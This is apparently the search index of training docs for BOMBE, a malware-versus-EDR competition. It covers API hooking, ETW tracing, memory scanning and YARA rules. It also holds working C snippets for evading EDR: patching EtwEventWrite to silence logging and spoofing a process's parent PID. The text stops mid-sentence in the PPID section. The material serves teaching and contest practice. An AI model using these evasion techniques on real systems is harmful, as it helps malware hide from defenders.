{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to BOMBE Docs","text":"<p>Welcome to BOMBE Docs!</p> <p>BOMBE (Battle Of Malware Bypass and EDR) is a match where malware and EDR systems compete against each other inside a single VM. It's like a Attack and Defense style of CTF, but different! We will provide quick start guide and some direction for those who are new to this field.</p>"},{"location":"getstarted/","title":"Get Started","text":"<p>You can start from our sample code https://github.com/bombe-match/bombe-poc. Our sample code is written in <code>C#</code> with <code>.NET Runtime 6.0</code>.  </p> <p>Don't forget the replace secret</p> <p>Remember to replace the <code>secret</code> with your own <code>secret</code>! The <code>secret</code> used in the sample and test environment is <code>00000000000000000000000000000000</code>.</p> <pre><code>git clone https://github.com/bombe-match/bombe-poc\n</code></pre>"},{"location":"getstarted/#test-environment","title":"Test Environment","text":"<p>We have publish a playground AMI <code>ami-0bb2ef6ddb9e62238</code> for you to test your sample. In AWS console, you can launch an new EC2 and search for our AMI <code>ami-0bb2ef6ddb9e62238</code>.</p> <p></p> <p>Choose our AMI in Communtiy AMI.</p> <p></p> <p>Inside the environment, we have already placed all 3 flags inside:</p> <ol> <li>Registry: <code>answer_1</code> in <code>HKCU:\\SOFTWARE\\BOMBE</code><ul> <li>flag is <code>BOMBE_MAL_FLAG_11111111111111111111111111111111</code></li> </ul> </li> <li>Encrypted SQLite database: <code>C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data</code><ul> <li>flag is <code>BOMBE_MAL_FLAG_22222222222222222222222222222222</code></li> <li>the <code>secret</code> used to decrypt the flag is <code>00000000000000000000000000000000</code></li> </ul> </li> <li>Memory of the specified process: <code>bsass.exe</code><ul> <li>flag is <code>BOMBE_MAL_FLAG_33333333333333333333333333333333</code></li> <li>the process will automatically run on system start up.</li> </ul> </li> </ol> <p>Refers to our Rules for more information.</p>"},{"location":"Learn/EDR/API-Hooking/","title":"API hooking","text":"<p>API hooking is a process of intercepting and altering the behavior of API calls. This technique is commonly used by many Endpoint Detection and Response (EDR) or antivirus vendors to monitor processes or code execution in real-time for malicious activity.</p>"},{"location":"Learn/EDR/API-Hooking/#the-process-of-api-hooking","title":"The process of API hooking","text":"<p>API hooking occurs during the startup of a program when certain libraries/DLLs are loaded as modules into the address space of the corresponding user program.</p> <p></p> <p>Step 1: When the program calls MessageBoxA(), it jumps to the address of that function.</p> <p>Step 2: Insert a jump instruction (jmp) in MessageBoxA() to redirect it to our hook function.</p> <p>Step 3: After executing the hook, it jumps to the trampoline function, which contains a copy of the original first few bytes of MessageBoxA(). This allows the original function's logic to continue after the hook function executes.</p> <p>Step 4: Once MessageBoxA() finishes executing, it returns to the user code to continue execution.</p>"},{"location":"Learn/EDR/API-Hooking/#microsoft-detours","title":"Microsoft Detours","text":"<p>Microsoft Detours is a software package for monitoring and intercepting API calls on Windows. It provides a general method for implementing x86 and x64 Windows API hooking, allowing for monitoring, tampering, or any other actions you wish to perform using API hooking. For more details, please refer to Detours.</p> <p>Example:</p> <p>The following code demonstrates how to use the Detours library to hook a function on the Windows platform and how to unhook it.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;detours.h&gt;\n#include &lt;iostream&gt;\n\ntypedef BOOL(WINAPI* FuncMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);\nFuncMessageBoxA pMessageBoxA = MessageBoxA;\n\nBOOL WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)\n{\n    std::cout &lt;&lt; \"Intercepted MessageBoxA called!\" &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"Text: \" &lt;&lt; lpText &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"Caption: \" &lt;&lt; lpCaption &lt;&lt; std::endl;\n    BOOL result = pMessageBoxA(hWnd, \"Hooked Function\", lpCaption, uType);\n    return result;\n}\nint main()\n{\n    DetourTransactionBegin();\n    DetourUpdateThread(GetCurrentThread()); //Setting the current thread as the target thread for Detours\n    DetourAttach(&amp;(PVOID&amp;)pMessageBoxA, HookedMessageBoxA); //Replacing the function pointer for MessageBoxA with the function pointer for HookedMessageBoxA\n    DetourTransactionCommit(); //Submitting the hook operation\n    // Hooked\n    MessageBoxA(NULL, \"Original MessageBox!\", \"Hooked MessageBoxA\", MB_OK);\n    getchar();\n\n    /*DetourTransactionBegin();\n    DetourUpdateThread(GetCurrentThread());\n    DetourDetach(&amp;(PVOID&amp;)pMessageBoxA, HookedMessageBoxA); //Removing a previously added hook\n    DetourTransactionCommit();\n    // Original\n    MessageBoxA(NULL, \"Really Original Messagebox!\", \"Original MessageBoxA\", MB_OK);\n    */\n\n    return 0;\n}\n</code></pre> <p>Hooking :  Cancel hooking : </p>"},{"location":"Learn/EDR/API-Hooking/#edr-hook-list","title":"EDR hook list","text":"<p>Antivirus software and Endpoint Detection and Response (EDR) platforms can also use behavior-based analysis to identify suspicious API activities. For a list of commonly used EDR hooks, you can refer to this curated EDR hook list.</p> <p></p>"},{"location":"Learn/EDR/API-Hooking/#tools","title":"Tools","text":"<ul> <li>https://github.com/microsoft/Detours</li> <li>https://github.com/Mr-Un1k0d3r/EDRs</li> </ul>"},{"location":"Learn/EDR/API-Hooking/#resource","title":"Resource","text":"<ul> <li>https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++</li> <li>https://khaled0x07.medium.com/windows-api-hooking-malware-analysis-960da6af5433</li> <li>https://www.linkedin.com/pulse/eppedr-api-hooking-daniel-feichter-1e/</li> <li>https://medium.com/@s12deff/api-hooking-with-detours-8d57313e59f6</li> </ul>"},{"location":"Learn/EDR/ETW/","title":"ETW","text":"<p>Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers.</p> <p></p> <p>The components of ETW include Controller, Provider, Consumer, and Session :</p> <ul> <li>Controller: Controls the enabling/disabling of Providers, creates Sessions, and sets which Providers are responsible.</li> <li>Provider: Generates events and sends them to Sessions.</li> <li>Consumer: Views and utilizes data from Sessions.</li> <li>Session: Records events from one or more Providers and manages/clears buffer data.</li> </ul>"},{"location":"Learn/EDR/ETW/#windows10etwevents","title":"Windows10EtwEvents","text":"<p>One Provider may offer multiple events, each identified by a specific Event ID.</p> <p>Therefore, there are online resources that compile information about various Providers and their corresponding event IDs. For details, please refer to Windows10EtwEvents.</p> <p>Example :</p> <p>Check Microsoft-Windows-Kernel-Process event</p> <p></p>"},{"location":"Learn/EDR/ETW/#using-etw","title":"Using ETW:","text":"<p>Windows includes a built-in tool called Logman, which can be used to view information about Providers and the status of Sessions.</p> <p>Example :</p> <ul> <li><code>logman query providers</code> allows you to see all configured Providers on the system</li> </ul> <p></p> <ul> <li>Viewing a specific Provider   </li> <li><code>logman create trace powershell-tracing -ets</code> Creating a session   </li> <li><code>logman update powershell-tracing -p Microsoft-Windows-PowerShell 0x83 -ets</code>   This command allows you to specify a Provider and choose the events provided by the Provider.</li> <li><code>-p</code> choose Provider</li> <li><code>0x83</code> subscribes to events from <code>Microsoft-Windows-PowerShell</code><ul> <li>0x0000000000000001 Runspace</li> <li>0x0000000000000002 Pipeline</li> <li>0x0000000000000080 Session</li> <li>0x01 + 0x02 + 0x80 = 0x83   </li> </ul> </li> <li>You can see <code>powershell-tracing.etl</code> from the Event Viewer.   </li> </ul>"},{"location":"Learn/EDR/ETW/#krabsetw","title":"krabsetw","text":"<p>krabsetw is a C++ library that simplifies interaction with ETW. For details, please refer to krabsetw.</p> <p>The following uses the krabsetw library to monitor process start events in the Windows system.</p> <pre><code>#include &lt;krabs.hpp&gt;\n#include &lt;iostream&gt;\n\nvoid start_etw_trace()\n{\n    krabs::user_trace trace;\n\n    krabs::provider&lt;&gt; provider(L\"Microsoft-Windows-Kernel-Process\"); //choose Provider\n    provider.any(0x10);  // choose event WINEVENT_KEYWORD_PROCESS\n\n    auto process_callback = [](const EVENT_RECORD&amp; record, const krabs::trace_context&amp; trace_context) {\n        krabs::schema schema(record, trace_context.schema_locator); // Definition of file structure\n        krabs::parser parser(schema); // Used for parsing and extracting specific property values from event logs.\n        uint32_t ppid = parser.parse&lt;uint32_t&gt;(L\"ParentProcessID\");\n        uint32_t pid = parser.parse&lt;uint32_t&gt;(L\"ProcessID\");\n        std::wstring image_name = parser.parse&lt;std::wstring&gt;(L\"ImageName\");\n\n        std::wcout &lt;&lt; L\"[&gt;] Process Name: \" &lt;&lt; image_name &lt;&lt; std::endl;\n        std::wcout &lt;&lt; L\"[&gt;] ParentProcess ID: \" &lt;&lt; ppid &lt;&lt; std::endl;\n        std::wcout &lt;&lt; L\"[&gt;] ProcessID \" &lt;&lt; pid &lt;&lt; std::endl;\n        std::wcout &lt;&lt; std::endl;\n        };\n\n    // real-time process start events\n    krabs::event_filter process_filter(krabs::predicates::id_is(1)); // Only capture events with ID 1.\n    process_filter.add_on_event_callback(process_callback); // When the filter captures an event, it will be passed to a callback for processing.\n    provider.add_filter(process_filter); // Add the filter to the provider.\n\n    trace.enable(provider); // Set up to use the specified Provider.\n    trace.start(); // Event tracing will officially start.\n}\n\nint main()\n{\n    std::cout &lt;&lt; \"[+] Monitoring Starting!\\n\" &lt;&lt; std::endl;\n    start_etw_trace();\n}\n</code></pre> Note <p>The executable needs to be run with administrator privileges to function properly.</p> <p></p>"},{"location":"Learn/EDR/ETW/#etwprocessmon2","title":"ETWProcessMon2","text":"<p>ETWProcessMon2 is for Monitoring Process/Thread/Memory/Imageloads/TCPIP via ETW + Detection for Remote-Thread-Injection &amp; Payload Detection by VirtualMemAlloc Events (in-memory) etc. For details, please refer to ETWProcessMon2 .</p>"},{"location":"Learn/EDR/ETW/#tools","title":"Tools","text":"<ul> <li>https://github.com/jdu2600/Windows10EtwEvents</li> <li>https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/logman</li> <li>https://github.com/DamonMohammadbagher/ETWProcessMon2</li> </ul>"},{"location":"Learn/EDR/ETW/#resource","title":"Resource","text":"<ul> <li>https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101</li> <li>https://github.com/microsoft/krabsetw</li> <li>https://blog.securehat.co.uk/detection-experiments/detecting-parent-process-spoofing-using-krabsetw</li> </ul>"},{"location":"Learn/EDR/ScanMemory/","title":"Scan Process Memory","text":"<p>In addition to scanning static files with Yara rules, directly scanning memory is another effective strategy for detecting malicious behavior. To scan a process's memory, we can use the VirtualQuery function. VirtualQuery is a Windows API function that retrieves information about a specified memory region. This function is very useful for memory analysis and malware detection, particularly when analyzing the memory distribution of a process.</p>"},{"location":"Learn/EDR/ScanMemory/#virtualquery","title":"VirtualQuery","text":"<p>The parameters of <code>VirtualQuery</code> is as follow. refer to https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualquery.</p> <pre><code>SIZE_T VirtualQuery(\n  [in, optional] LPCVOID                   lpAddress, // A pointer to the base address of the region of pages\n  [out]          PMEMORY_BASIC_INFORMATION lpBuffer,  // A pointer to a MEMORY_BASIC_INFORMATION structure\n  [in]           SIZE_T                    dwLength   // The size of the buffer pointed to by the lpBuffer\n);\n</code></pre>"},{"location":"Learn/EDR/ScanMemory/#memory_basic_information","title":"MEMORY_BASIC_INFORMATION","text":"<p>The output of <code>VirtualQuery</code> will be stored in the structure of <code>MEMORY_BASIC_INFORMATION</code>. The structure including information related to a range of pages in the process's virtual address space (e.g., base address, size, state, protection attributes, and type). refer to https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information.</p> <pre><code>typedef struct _MEMORY_BASIC_INFORMATION {\n    PVOID  BaseAddress;         // The base address of the memory region\n    PVOID  AllocationBase;      // The base address of the allocated memory region\n    DWORD  AllocationProtect;   // The protection attributes of the allocated memory region\n    WORD   PartitionId;         // The partition ID, a member added in Windows 10 version 2004\n    SIZE_T RegionSize;          // The size of the memory region\n    DWORD  State;               // The state of the memory region\uff08MEM_COMMIT,MEM_FREE,MEM_RESERVE\uff09\n    DWORD  Protect;             // The protection attributes of the current memory region\n    DWORD  Type;                // The type of the memory region\uff08MEM_IMAGE,MEM_MAPPED,MEM_PRIVATE\uff09\n} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;\n</code></pre>"},{"location":"Learn/EDR/ScanMemory/#example-1-of-virtualquery","title":"Example 1 of VirtualQuery","text":"<p>How to use the VirtualQuery function to query and output information about a specific memory region</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid PrintMemoryInfo(LPCVOID address) {\n    MEMORY_BASIC_INFORMATION mbi;\n    if (VirtualQuery(address, &amp;mbi, sizeof(mbi))) {\n        printf(\"Base Address: %p\\n\", mbi.BaseAddress);\n        printf(\"Allocation Base: %p\\n\", mbi.AllocationBase);\n        printf(\"Region Size: %zu bytes\\n\", mbi.RegionSize);\n        printf(\"State: 0x%lx\\n\", mbi.State);\n        printf(\"Type: 0x%lx\\n\", mbi.Type);\n    } else {\n        printf(\"VirtualQuery failed with error code %lu\\n\", GetLastError());\n    }\n}\n\nint main() {\n    PrintMemoryInfo((LPCVOID)0x00400000);\n    return 0;\n}\n</code></pre> <p>The return values:</p> <pre><code>Base Address: 0x00400000\nAllocation Base: 0x00400000\nRegion Size: 4096 bytes\nState: 0x1000 // MEM_COMMIT\nType: 0x20000 // MEM_PRIVATE\n</code></pre>"},{"location":"Learn/EDR/ScanMemory/#example-2-of-virtualquery","title":"Example 2 of VirtualQuery","text":"<p>We allocated a 1024-byte virtual memory block with VirtualAlloc, queried its information using VirtualQuery, and released it with VirtualFree. Ensure the lpBuffer size passed to VirtualQuery is sufficient to hold the queried virtual memory information to avoid ERROR_INSUFFICIENT_BUFFER.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\n#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\nint main() {\n    // Allocate a virtual memory block of size 1024 bytes\n    LPVOID p = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);\n    if (p == NULL) {\n        // Memory allocation failed\n        return -1;\n    }\n\n    // Define structure to store virtual memory information\n    MEMORY_BASIC_INFORMATION mbi;\n\n    // Query virtual memory information\n    SIZE_T size = VirtualQuery(p, &amp;mbi, sizeof(mbi));\n    if (size == 0) {\n        // Query failed\n        return -1;\n    }\n\n    // Output virtual memory information\n    std::cout &lt;&lt; \"Base address of the virtual memory block: \" &lt;&lt; mbi.BaseAddress &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"Size of the virtual memory block: \" &lt;&lt; mbi.RegionSize &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"State of the virtual memory block: \" &lt;&lt; mbi.State &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"Protection level of the virtual memory block: \" &lt;&lt; mbi.Protect &lt;&lt; std::endl;\n    std::cout &lt;&lt; \"Type of access to the virtual memory block: \" &lt;&lt; mbi.Type &lt;&lt; std::endl;\n\n    // Free virtual memory\n    VirtualFree(p, 0, MEM_RELEASE);\n\n    return 0;\n}\n</code></pre>"},{"location":"Learn/EDR/ScanMemory/#resource","title":"Resource","text":"<ul> <li>https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/</li> <li>https://www.secforce.com/blog/whisper2shout-unhooking-technique/</li> <li>https://github.com/MicrosoftDocs/windows-driver-docs/blob/staging/windows-driver-docs-pr/debugger/getting-started-with-windbg.md</li> </ul>"},{"location":"Learn/EDR/Yara/","title":"Yara rule","text":"<p>YARA is a tool primarily used for identifying and classifying malware samples. It is widely utilized in cybersecurity, especially by threat hunters and researchers.</p> <p>What we can do with Yara?</p> <ul> <li>Identify and classify malware</li> <li>find new malware samples and based on family-specific features</li> <li>find new exploits and zero-days</li> <li>help speeding up incident response</li> <li>classification: identify file formats, archives, packed files, known threats</li> <li>build your own private antivirus</li> </ul>"},{"location":"Learn/EDR/Yara/#recommended-software-when-writing-yara-rule","title":"Recommended software when writing Yara rule","text":"<p>These tools can help you write YARA rules more smoothly.</p> <ul> <li>String analyzer</li> <li>PE file structure viewer</li> <li>Hex viewer</li> <li>Binary diffing tool</li> <li>IDA Pro / Ghidra</li> </ul>"},{"location":"Learn/EDR/Yara/#the-components-of-yara","title":"The components of Yara","text":"<p>Yara include Meta, Strings, Condition</p> <ul> <li>Meta: The meta section contains metadata about the rule. It's not used for matching but provides useful information.</li> <li>String: The strings section lists the patterns the rule is looking for in the files.</li> <li>Condition: The condition section defines the criteria for the rule to match.</li> </ul>"},{"location":"Learn/EDR/Yara/#example-of-yara-rule","title":"Example of Yara rule","text":"<pre><code>rule ExampleRule {\n    meta:\n        author = \"Bobo\"\n        type = \"APT\"\n        description = \"This rule detects a specific malicious file based on known strings.\"\n        date = \"2024-07-01\"\n    strings:\n        $string1 = \"malicious_string_1\"\n        $string2 = \"malicious_string_2\"\n        $hex_string = { 6D 61 6C 69 63 69 6F 75 73 }\n    condition:\n        (uint16(0) == 0x4D5A) and (any of ($string*)) (filesize &lt; 5000000) and ($hex_string)\n}\n</code></pre> <p>In the above example :</p> <ul> <li>The meta section includes information about this rule such as the author's name, category, a brief description, and the creation date</li> <li>The strings section includes what the rule looking for :</li> <li>$string1: This string identifier looks for the ASCII string \"malicious_string_1\".</li> <li>$string2: This string identifier looks for the ASCII string \"malicious_string_2\".</li> <li>$hex_string: This identifier looks for a specific sequence of hexadecimal bytes (which translates to the ASCII string \"malicious\").</li> <li>In this condition, it means that it should successfully match certain conditions.</li> <li>uint16(0) == 0x4D5A: This checks if the first two bytes of the file are 0x4D5A, which is the magic number for a Windows executable (MZ header).</li> <li>any of ($string*): This checks if any of the strings defined in the strings section (with identifiers starting with $string) are present in the file.</li> <li>the filesize can't &gt; 5MB</li> <li>($hex_string): This checks if the specific hexadecimal string is present in the file.</li> </ul> <p>To run this rule, open the terminal and type :</p> <pre><code>yara -r -s ExampleRule.yara  game.exe\n</code></pre> <p><code>-r</code> is used to check all the directory recursively. <code>-s</code> is used to show the matched strings. ExampleRule.yara is the rule file we made earlier. game.exe is the malware file we check for matching strings.</p> <p>For more detailed information about YARA rule keywords and methods, please refer to its documentation. https://yara.readthedocs.io/en/stable/index.html</p>"},{"location":"Learn/EDR/Yara/#using-yara-from-python","title":"Using Yara from Python","text":"<p>Here's a simple example of writing a YARA scanner in Python using the yara-python library. This script will compile a YARA rule, scan a file for matches, and print the results.</p> <p>Before you start, make sure you have the yara-python library installed. You can install it using pip:</p> <pre><code>pip install yara-python\n</code></pre> <p>The Yara rule using what we have just created:</p> <pre><code>rule ExampleRule {\n    meta:\n        author = \"Bobo\"\n        type = \"APT\"\n        description = \"This rule detects a specific malicious file based on known strings.\"\n        date = \"2024-07-01\"\n    strings:\n        $string1 = \"malicious_string_1\"\n        $string2 = \"malicious_string_2\"\n        $hex_string = { 6D 61 6C 69 63 69 6F 75 73 }\n    condition:\n        (uint16(0) == 0x4D5A) and (any of ($string*)) (filesize &lt; 5000000) and ($hex_string)\n}\n</code></pre> <p>Next, create a Python script named yara_scanner.py:</p> <pre><code>import yara\n\n# Define the path to the YARA rule file and the file to scan\nrule_file = 'example_rule.yar'\nfile_to_scan = 'sample_file.exe'\n\n# Compile the YARA rule\nrules = yara.compile(filepath=rule_file)\n\n# Scan the file\nmatches = rules.match(file_to_scan)\n\n# Print the results\nif matches:\n    print(f\"YARA rule matched! Details:\\n{matches}\")\nelse:\n    print(\"No matches found.\")\n</code></pre> <p>To run the script, save it as yara_scanner.py and run it in your terminal:</p> <pre><code>python yara_scanner.py\n</code></pre> <p>Make sure you have a file named sample_file.exe to scan in the same directory as the script or provide the correct path to a file you want to scan.</p> <p>For more detailed information about Yara-python keywords and methods, please refer to its documentation https://yara.readthedocs.io/en/stable/yarapython.html</p>"},{"location":"Learn/EDR/Yara/#tools","title":"Tools","text":"<ul> <li>https://github.com/VirusTotal/yara</li> <li>https://github.com/VirusTotal/yara-python</li> <li>https://github.com/InQuest/awesome-yara</li> <li>https://github.com/100DaysofYARA</li> </ul>"},{"location":"Learn/EDR/Yara/#resource","title":"Resource","text":"<ul> <li>https://www.brighttalk.com/webcast/15591/388802</li> <li>https://www.picussecurity.com/resource/glossary/what-is-a-yara-rule</li> <li>https://www.varonis.com/blog/yara-rules</li> </ul>"},{"location":"Learn/Malware/Bypass-API-Hooking/","title":"Bypass API Hooking","text":"<p>API hooking modifies the content of Windows APIs in system libraries (e.g., <code>ntdll.dll</code>, <code>kernel32.dll</code>, ...) in memory to place hooks and hijack the control flow. There are basically two methods to bypass API hooking. One method is to restore the original system library in memory, and the other method is to bypass Windows APIs altogether and call syscall directly.</p> <p>To restore system library, such as <code>ntdll.dll</code>, in memory comes several ways:</p> <ul> <li>Read <code>ntdll.dll</code> from filesystem and overwrite <code>ntdll.dll</code> in memory</li> <li>Map <code>\\KnownDlls\\ntdll.dll</code> section to memory</li> </ul> <p>However, there are some disadvantages to restoring system libraries. First, you still need to call Windows APIs to read the file, which are monitored by EDR. Second, EDR can reapply API hooking.</p> <p>The second method is to call syscalls directly, avoiding Windows APIs altogether. Unlike Linux, Windows changes the mapping of SSNs (System Service Numbers) frequently. To call syscalls in Windows, you need to know the SSN mapping for different Windows versions. There are various ways to obtain this mapping:</p> <ul> <li>SSN mapping maintained by SysWhisper</li> <li>Parsing <code>Nt-</code> / <code>Zw-</code> APIs from <code>ntdll.dll</code> in memory and sorting them by address, which is a preferred method nowadays. This approach allows us to avoid maintaining the SSN mapping ourselves, as we can derive it from <code>ntdll.dll</code>. SysWhispers3 implement this kind of method.</li> </ul> <p>EDR can easily detect syscall behavior by statically scanning for syscall patterns, as normal programs do not use syscalls directly. To avoid detection, malware can generate the syscall assembly at runtime, a technique implemented as <code>egghunter</code> in SysWhispers3.</p> <p>Additionally, EDR can detect syscall behavior by examining the program's call stack. Typically, a program will enter the kernel directly instead of going through <code>ntdll.dll</code>. To evade this, malware can use a syscall gadget and jump to ntdll.dll after setting the SSN in the rax register. This technique is implemented as <code>jumper</code> in SysWhispers3.</p>"},{"location":"Learn/Malware/Bypass-API-Hooking/#tools","title":"Tools","text":"<ul> <li>https://github.com/jthuraisamy/SysWhispers</li> <li>https://github.com/jthuraisamy/SysWhispers2</li> <li>https://github.com/klezVirus/SysWhispers3</li> <li>https://github.com/crummie5/FreshyCalls</li> </ul>"},{"location":"Learn/Malware/Bypass-API-Hooking/#resource","title":"Resource","text":"<ul> <li>https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</li> <li>https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/</li> <li>https://www.crow.rip/crows-nest/mal/dev/inject/syscalls/indirect-syscalls</li> <li>https://dosxuz.gitlab.io/post/perunsfart/</li> <li>https://blog.sektor7.net/#!res/2021/perunsfart.md</li> </ul>"},{"location":"Learn/Malware/ETW-Patch/","title":"ETW Patch","text":"<p>Event Tracing for Windows (ETW) is a powerful mechanism provided by Windows for tracing and logging system events. ETW patching involves modifying the ETW infrastructure to either hide certain events from being logged or to manipulate the event data for various purposes. This technique can be used by both legitimate developers for debugging and by adversaries for evasion.</p>"},{"location":"Learn/Malware/ETW-Patch/#how-etw-patching-works","title":"How ETW Patching Works","text":"<p>ETW operates through providers that generate events, which are captured by consumers. The flow of ETW can be intercepted and manipulated by patching specific functions in the ETW stack. This is typically done by hooking or overwriting parts of the ETW-related functions in <code>ntdll.dll</code> or other relevant libraries.</p>"},{"location":"Learn/Malware/ETW-Patch/#common-targets-for-etw-patching","title":"Common Targets for ETW Patching","text":"<ol> <li><code>EtwEventWrite</code>: This function is responsible for writing events. By patching it, one can prevent specific events from being logged.</li> <li><code>EtwEventRegister</code>: This function registers an event provider. By patching it, one can control or prevent certain providers from registering.</li> </ol>"},{"location":"Learn/Malware/ETW-Patch/#example-patching-etweventwrite","title":"Example: Patching <code>EtwEventWrite</code>","text":"<p>Below is a basic example of how one might patch the <code>EtwEventWrite</code> function to prevent certain events from being logged. This is a simplified example for educational purposes.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n// Function pointer type for the original EtwEventWrite\ntypedef ULONG (NTAPI *EtwEventWrite_t)(REGHANDLE, PCEVENT_DESCRIPTOR, ULONG, PEVENT_DATA_DESCRIPTOR);\n\n// Original function pointer\nEtwEventWrite_t OriginalEtwEventWrite = NULL;\n\n// Hook function\nULONG NTAPI HookedEtwEventWrite(REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData)\n{\n    // Example condition to skip certain events\n    if (EventDescriptor-&gt;Id == 12345) // Replace 12345 with the specific event ID to filter\n    {\n        return 0; // Skip the event\n    }\n\n    // Call the original EtwEventWrite function\n    return OriginalEtwEventWrite(RegHandle, EventDescriptor, UserDataCount, UserData);\n}\n\n// Function to patch EtwEventWrite\nvoid PatchEtwEventWrite()\n{\n    // Get the address of EtwEventWrite in ntdll.dll\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    if (hNtdll)\n    {\n        OriginalEtwEventWrite = (EtwEventWrite_t)GetProcAddress(hNtdll, \"EtwEventWrite\");\n        if (OriginalEtwEventWrite)\n        {\n            // Replace the first few bytes of EtwEventWrite with a jump to our hook function\n            DWORD oldProtect;\n            VirtualProtect(OriginalEtwEventWrite, 5, PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n\n            // Calculate the relative address for the jump\n            DWORD64 relativeAddress = (DWORD64)HookedEtwEventWrite - (DWORD64)OriginalEtwEventWrite - 5;\n\n            // Write the jump instruction\n            BYTE jumpInstruction[5] = { 0xE9 }; // JMP opcode\n            memcpy(jumpInstruction + 1, &amp;relativeAddress, 4);\n            memcpy(OriginalEtwEventWrite, jumpInstruction, 5);\n\n            VirtualProtect(OriginalEtwEventWrite, 5, oldProtect, &amp;oldProtect);\n        }\n    }\n}\n\nint main()\n{\n    // Patch EtwEventWrite\n    PatchEtwEventWrite();\n\n    // Your application logic here\n\n    return 0;\n}\n</code></pre>"},{"location":"Learn/Malware/ETW-Patch/#limitation","title":"Limitation","text":"<p>Not all ETW providers can be bypassed through simple patching techniques. Specifically, many ETW providers operate from within the kernel, making them more challenging to intercept or manipulate.</p>"},{"location":"Learn/Malware/ETW-Patch/#tools","title":"Tools","text":"<ul> <li>https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch</li> <li>https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32</li> </ul>"},{"location":"Learn/Malware/ETW-Patch/#resource","title":"Resource","text":"<ul> <li>https://jsecurity101.medium.com/understanding-etw-patching-9f5af87f9d7b</li> <li>https://www.phrack.me/tools/2023/04/10/Patching-ETW-in-C.html</li> <li>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</li> </ul>"},{"location":"Learn/Malware/PPID-Spoofing/","title":"PPID Spoofing","text":""},{"location":"Learn/Malware/PPID-Spoofing/#what-is-ppid-spoofing","title":"What is PPID Spoofing ?","text":"<p>PPID (Parent Process ID) Spoofing is a technique used by red team operators to alter the Parent Process ID of a process, thereby concealing its true origin or avoiding detection. Typically, a process's Parent Process ID reveals which process initiated it. By modifying this ID, malicious software can impersonate being started by a legitimate process (such as explorer.exe) rather than its actual malicious origin. Hence, PPID Spoofing attacks can be considered as leveraging vulnerabilities in the Kernel Driver.</p>"},{"location":"Learn/Malware/PPID-Spoofing/#purpose-and-principle","title":"Purpose and Principle","text":"<p>By default, most programs that require user interaction are launched by explorer.exe. For example, when we create a new text document on the desktop and then open it with Notepad, the process is as shown in the following illustration:</p> <p>Process Explorer or Process Hacker can be used to observe the relationships between processes in this scenario.</p> <p></p> <p>You can clearly see the parent-child relationship: <code>explorer.exe</code> -&gt; <code>Notepad.exe</code>.</p> <p>However, with the following code, we can make <code>Notepad.exe</code> appear as if it was created by <code>Discord.exe</code> (PID: 19100).</p> <pre><code>#define _CRT_SECURE_NO_WARNINGS\n\n#include &lt;windows.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;iostream&gt;\n\nint main()\n{\n    STARTUPINFOEXA si;\n    PROCESS_INFORMATION pi;\n    SIZE_T attributeSize;\n    ZeroMemory(&amp;si, sizeof(STARTUPINFOEXA));\n\n    // To modify the PID here\n    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 19100);\n\n    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;attributeSize);\n    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);\n    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;attributeSize);\n    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, sizeof(HANDLE), NULL, NULL);\n    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);\n\n    CreateProcessA(NULL, (LPSTR)\"notepad\", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;si.StartupInfo, &amp;pi);\n\n    return 0;\n}\n</code></pre> <p></p> <p>The key function here is CreateProcessA.</p>"},{"location":"Learn/Malware/PPID-Spoofing/#what-is-createprocessa","title":"What is CreateProcessA ?","text":"<p><code>CreateProcessA</code> is generally used to create new processes, and by default, it will use the inherited parent to create the process. For example, if opened through cmd, its parent is cmd. However, this function also supports a parameter called <code>lpStartupInfo</code>, where you can customize its parent process.</p> <p><code>[in] lpStartupInfo</code></p> <p>A pointer to a STARTUPINFO or STARTUPINFOEX structure.</p> <p>To set extended attributes, use a STARTUPINFOEX structure and specify EXTENDED_STARTUPINFO_PRESENT in the 